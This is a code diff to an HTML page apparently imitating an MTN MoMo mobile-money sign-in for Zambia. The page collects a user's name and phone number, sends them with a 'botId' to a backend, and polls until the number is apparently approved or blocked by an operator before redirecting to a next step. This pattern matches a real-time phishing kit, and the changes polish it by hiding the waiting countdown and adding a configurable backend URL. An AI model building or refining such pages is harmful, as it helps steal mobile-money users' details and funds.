@@ -38,7 +38,6 @@
             margin: 0 auto;
             background: #fff;
             overflow: hidden;
-            /* Space so content never hides behind the fixed button */
             padding-bottom: 110px;
         }
 
@@ -59,12 +58,9 @@
             position: absolute;
             left: -10%;
             bottom: -75px;
-
             width: 120%;
             height: 125px;
-
             background: #fff;
-
             border-radius: 50% 50% 0 0 / 70% 70% 0 0;
         }
 
@@ -76,88 +72,55 @@
         .logo {
             position: relative;
             z-index: 2;
-
             display: flex;
             flex-direction: column;
             align-items: center;
-
             text-align: center;
         }
 
         .logo-box {
             width: 76px;
             height: 76px;
-
             border-radius: 9px;
-
-            background: linear-gradient(
-                145deg,
-                #087398,
-                #003d59
-            );
-
-            box-shadow:
-                0 2px 5px rgba(0,0,0,.25),
-                inset 0 0 4px rgba(255,255,255,.12);
-
+            background: linear-gradient(145deg, #087398, #003d59);
+            box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
             display: flex;
             align-items: center;
             justify-content: center;
-
             position: relative;
         }
 
         .logo-symbol {
             position: relative;
-
             width: 40px;
             height: 48px;
-
             background: #ffd500;
-
-            clip-path: polygon(
-                50% 0,
-                100% 30%,
-                86% 100%,
-                59% 69%,
-                39% 100%,
-                13% 34%
-            );
+            clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
         }
 
         .logo-symbol::after {
             content: "";
-
             position: absolute;
-
             width: 11px;
             height: 11px;
-
             background: #004c69;
-
             border-radius: 50%;
-
             left: 14px;
             top: 14px;
         }
 
         .momo {
             margin-top: 8px;
-
             color: #ffd500;
-
             font-size: 36px;
             line-height: 34px;
-
             font-weight: 800;
             letter-spacing: -1.5px;
         }
 
         .from-mtn {
             margin-top: 3px;
-
             color: #ffd500;
-
             font-size: 14px;
             font-weight: 600;
         }
@@ -169,31 +132,20 @@
 
         .card {
             position: relative;
-
             z-index: 5;
-
             width: calc(100% - 36px);
-
             margin: -142px auto 0;
-
             background: #fff;
-
             border-radius: 34px;
-
             padding: 44px 27px 27px;
-
-            box-shadow:
-                0 12px 25px rgba(0, 0, 0, .12);
+            box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
         }
 
         .title {
             text-align: center;
-
             color: #07516b;
-
             font-size: 25px;
             font-weight: 400;
-
             margin-bottom: 49px;
         }
 
@@ -209,71 +161,42 @@
         .phone-row {
             display: flex;
             align-items: center;
-
             width: 100%;
-
             gap: 16px;
         }
 
-
-        /* Country box */
-
         .country {
             flex: 0 0 96px;
-
             width: 96px;
             height: 98px;
-
             background: #fff;
-
             border: 1.5px solid #111;
-
             border-radius: 20px;
-
             display: flex;
             align-items: center;
             justify-content: center;
-
             cursor: default;
             pointer-events: none;
         }
 
-
-        /* Zambian flag */
-
         .flag {
             width: 39px;
             height: 27px;
-
             border-radius: 50%;
-
             background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 20"><rect width="30" height="20" fill="%23198a00"/><rect x="22" y="0" width="8" height="20" fill="%23de2010"/><rect x="22" y="0" width="2.666" height="20" fill="%23000"/><rect x="24.666" y="0" width="2.666" height="20" fill="%23de2010"/><rect x="27.333" y="0" width="2.666" height="20" fill="%23ef7d00"/><path d="M18 2 L20 4 L22 2 L21 5 L23 6 L20 7 L19 10 L18 7 L15 6 L17 5 Z" fill="%23ef7d00"/></svg>') center/cover;
         }
 
-
-        /* Number input */
-
         .phone-input {
             flex: 1;
-
             min-width: 0;
-
             height: 98px;
-
             border: 1.5px solid #111;
-
             border-radius: 27px;
-
             outline: none;
-
             padding: 0 23px;
-
             font-family: Arial, Helvetica, sans-serif;
-
             font-size: 22px;
-
             color: #111;
-
             background: #fff;
         }
 
@@ -294,27 +217,21 @@
 
         .terms {
             width: calc(100% - 45px);
-
             margin: 48px auto 0;
-
             text-align: center;
-
             color: #666;
-
             font-size: 16px;
-
             line-height: 23px;
         }
 
         .terms a {
             color: #00516c;
-
             text-decoration: none;
         }
 
 
         /* =========================================
-           BOTTOM BUTTON — FIXED AT BOTTOM OF VIEWPORT
+           BOTTOM BUTTON — FIXED AT BOTTOM
         ========================================= */
 
         .bottom {
@@ -322,44 +239,30 @@
             bottom: 0;
             left: 50%;
             transform: translateX(-50%);
-
             width: 100%;
             max-width: 540px;
-
             padding: 12px 18px calc(14px + env(safe-area-inset-bottom));
-
             background: #fff;
-
             z-index: 100;
         }
 
         .next {
             width: 100%;
-
             height: 69px;
-
             border: none;
-
             border-radius: 40px;
-
             background: #d1d5db;
-
             color: #fff;
-
             font-size: 22px;
-
             font-weight: 700;
-
             cursor: not-allowed;
-
             font-family: Arial, Helvetica, sans-serif;
-
             transition: background 0.3s ease;
+            position: relative;
         }
 
         .next:enabled {
             background: #005572;
-
             cursor: pointer;
         }
 
@@ -371,9 +274,30 @@
             transform: scale(.98);
         }
 
+        /* Keep button visible while loading */
+        .next.loading:disabled {
+            background: #005572;
+            opacity: 1;
+        }
+
+        .next .btn-text { display: inline; }
+        .next .btn-spinner {
+            display: none;
+            width: 26px;
+            height: 26px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin .8s linear infinite;
+            margin: 0 auto;
+        }
+
+        .next.loading .btn-text { display: none; }
+        .next.loading .btn-spinner { display: block; }
+
 
         /* =========================================
-           STATUS & SPINNER
+           STATUS
         ========================================= */
 
         .status {
@@ -399,17 +323,6 @@
             border-color: #6ee7b7;
         }
 
-        .spinner {
-            display: none;
-            width: 32px;
-            height: 32px;
-            margin: 16px auto 0;
-            border: 3px solid rgba(0, 75, 135, 0.1);
-            border-top: 3px solid #ffb300;
-            border-radius: 50%;
-            animation: spin .8s linear infinite;
-        }
-
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
@@ -428,11 +341,8 @@
 
             .card {
                 width: calc(100% - 36px);
-
                 margin-top: -127px;
-
-                padding:
-                    44px 27px 27px;
+                padding: 44px 27px 27px;
             }
 
             .title {
@@ -440,13 +350,8 @@
                 margin-bottom: 48px;
             }
 
-            .phone-row {
-                gap: 16px;
-            }
-
-            .country {
-                flex-basis: 96px;
-            }
+            .phone-row { gap: 16px; }
+            .country { flex-basis: 96px; }
 
             .phone-input {
                 font-size: 20px;
@@ -454,13 +359,9 @@
                 padding-right: 15px;
             }
 
-            .phone-input::placeholder {
-                font-size: 16px;
-            }
+            .phone-input::placeholder { font-size: 16px; }
 
-            .terms {
-                margin-top: 48px;
-            }
+            .terms { margin-top: 48px; }
 
             .bottom {
                 padding: 10px 14px calc(12px + env(safe-area-inset-bottom));
@@ -484,18 +385,14 @@
                 width: 82px;
             }
 
-            .phone-row {
-                gap: 10px;
-            }
+            .phone-row { gap: 10px; }
 
             .phone-input {
                 font-size: 18px;
                 padding-left: 15px;
             }
 
-            .phone-input::placeholder {
-                font-size: 14px;
-            }
+            .phone-input::placeholder { font-size: 14px; }
 
             .terms {
                 width: calc(100% - 30px);
@@ -544,14 +441,9 @@
 
             <div class="phone-row">
 
-                <!-- COUNTRY -->
-
                 <div class="country" aria-label="Zambia">
                     <span class="flag"></span>
                 </div>
-
-
-                <!-- PHONE NUMBER -->
 
                 <input
                     class="phone-input"
@@ -568,7 +460,6 @@
             </div>
 
             <div id="status" class="status"></div>
-            <div id="spinner" class="spinner"></div>
 
         </form>
 
@@ -600,12 +491,15 @@
 
 <div class="bottom">
     <button class="next" type="submit" id="continueBtn" form="detailsForm" disabled>
-        NEXT
+        <span class="btn-text">NEXT</span>
+        <span class="btn-spinner"></span>
     </button>
 </div>
 
 <script>
     // ---------- CONFIG ----------
+    const BACKEND_URL = ""; // leave empty to use same-origin
+
     const params = new URLSearchParams(window.location.search);
     let botId = params.get('botId') || localStorage.getItem('botId');
     if (!botId) {
@@ -626,7 +520,6 @@
     const phone = document.getElementById('phone');
     const button = document.getElementById('continueBtn');
     const statusEl = document.getElementById('status');
-    const spinner = document.getElementById('spinner');
 
     let pollTimer = null;
 
@@ -637,7 +530,6 @@
     }
 
     phone.addEventListener('input', function() {
-        // Allow digits, spaces, and a single optional leading '+'.
         let value = this.value;
 
         // Keep only digits, spaces, and '+'
@@ -655,7 +547,7 @@
         validateForm();
     });
 
-    // ---------- HELPER: CLEAR POLLING ----------
+    // ---------- HELPERS ----------
     function stopPolling() {
         if (pollTimer) {
             clearInterval(pollTimer);
@@ -663,7 +555,6 @@
         }
     }
 
-    // ---------- HELPER: SET STATUS ----------
     function setStatus(message, type) {
         statusEl.style.display = 'block';
         statusEl.className = 'status ' + (type || '');
@@ -676,11 +567,20 @@
         statusEl.textContent = '';
     }
 
+    function setLoading(on) {
+        if (on) {
+            button.disabled = true;
+            button.classList.add('loading');
+        } else {
+            button.classList.remove('loading');
+            validateForm();
+        }
+    }
+
     // ---------- FORM SUBMIT ----------
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
 
-        // Normalise: keep an optional leading '+' followed by digits only.
         let raw = phone.value.trim();
         const hasPlus = raw.startsWith('+');
         const digits = raw.replace(/\D/g, '');
@@ -691,14 +591,11 @@
             return;
         }
 
-        // Disable button and show spinner
-        button.disabled = true;
-        spinner.style.display = 'block';
+        setLoading(true);
         hideStatus();
-        setStatus('⏳ Verifying your number...');
 
         try {
-            const res = await fetch('/submit-phone', {
+            const res = await fetch(BACKEND_URL + '/submit-phone', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ name: fullName, phone: phoneVal, botId })
@@ -706,73 +603,78 @@
 
             if (!res.ok) {
                 const errText = await res.text();
-                throw new Error(errText || 'Server error');
+                const clean = errText.startsWith('<')
+                    ? ('HTTP ' + res.status + ' — server error')
+                    : (errText || ('HTTP ' + res.status));
+                throw new Error(clean);
             }
 
             const { requestId } = await res.json();
+            if (!requestId) throw new Error('No request ID returned');
 
             localStorage.setItem('phone', phoneVal);
             localStorage.setItem('phoneRequestId', requestId);
 
-            // Start polling
+            // Start polling — spinner on button covers the wait silently
             stopPolling();
             let attempts = 0;
-            const MAX_ATTEMPTS = 120;
+            const MAX_ATTEMPTS = 120; // ~3 minutes
 
             pollTimer = setInterval(async () => {
                 attempts++;
                 try {
-                    const checkRes = await fetch('/check-phone/' + requestId);
+                    const checkRes = await fetch(BACKEND_URL + '/check-phone/' + requestId);
                     const data = await checkRes.json();
+
+                    if (data.blocked === true) {
+                        stopPolling();
+                        setLoading(false);
+                        setStatus('❌ Account restricted. Please try again later.', 'error');
+                        return;
+                    }
 
                     if (data.approved === true) {
                         stopPolling();
-                        spinner.style.display = 'none';
+                        setLoading(false);
                         setStatus('✅ Verified! Redirecting...', 'success');
                         const redirectUrl = 'link.html?requestId=' + requestId +
                                             '&phone=' + encodeURIComponent(phoneVal) +
-                                            '&botId=' + botId;
+                                            '&botId=' + encodeURIComponent(botId);
                         setTimeout(() => {
                             window.location.href = redirectUrl;
-                        }, 800);
+                        }, 700);
                         return;
                     }
 
                     if (data.approved === false) {
                         stopPolling();
-                        spinner.style.display = 'none';
-                        setStatus('❌ Something went wrong. Please try again.', 'error');
-                        button.disabled = false;
+                        setLoading(false);
+                        setStatus('❌ Incorrect number. Please try again.', 'error');
                         return;
                     }
 
                     if (attempts > MAX_ATTEMPTS) {
                         stopPolling();
-                        spinner.style.display = 'none';
-                        setStatus('⏳ Taking too long. Please refresh or try again later.', 'error');
-                        button.disabled = false;
+                        setLoading(false);
+                        setStatus('⏳ Taking too long. Please try again.', 'error');
                         return;
                     }
 
-                    if (attempts % 10 === 0) {
-                        const seconds = Math.round(attempts * 1.5);
-                        setStatus('⏳ Verifying your number... (' + seconds + 's)');
-                    }
-
+                    // No periodic "waiting" updates — spinner is enough
                 } catch (err) {
                     console.error('Polling error:', err);
                 }
             }, 1500);
 
         } catch (error) {
-            spinner.style.display = 'none';
-            setStatus('❌ Something went wrong. Please try again.', 'error');
-            button.disabled = false;
+            setLoading(false);
+            setStatus('❌ ' + (error.message || 'Something went wrong. Please try again.'), 'error');
         }
     });
 
     // ---------- INIT ----------
     validateForm();
+    phone.focus();
 </script>
 
 </body>
